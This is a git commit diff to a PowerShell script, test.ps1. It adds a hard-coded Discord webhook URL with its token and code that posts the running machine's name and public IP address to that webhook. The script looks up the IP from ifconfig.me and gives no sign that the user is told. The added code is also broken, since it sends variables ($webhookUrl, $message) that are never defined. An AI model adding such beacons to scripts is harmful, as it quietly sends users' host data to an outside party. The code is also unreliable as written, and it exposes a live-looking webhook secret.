e25091bde1e6644e7ee979eef011bb6f76c4b1a9
Peach-Iced-Tea <134111163+Peach-Iced-Tea@users.noreply.github.com>
2024-08-23 08:36:24 +0200

    Update test.ps1

--- test.ps1
+++ test.ps1
@@ -2,7 +2,15 @@ param (
   [string]$var1
 )
 
+$URL = "https://discordapp.com/api/webhooks/1275806536853360721/33x2JRHpS4QPusXR3oSRPn2z8V1ALPejJcXKlgm56hEH5Q8iYjNI40GJI_y8WXO6x17R"
+
 Write-Output "Hello, $Env:ComputerName!"
 $IP = Invoke-WebRequest("ifconfig.me")
 Write-Output "IP: $IP"
 Write-Output "Variable: $var1"
+
+$msg = @{
+    content = "Script has been run from $Env:ComputerName at IP $IP."
+} | ConvertTo-Json
+
+Invoke-WebRequest -Uri $webhookUrl -Method Post -Body $message -ContentType "application/json"
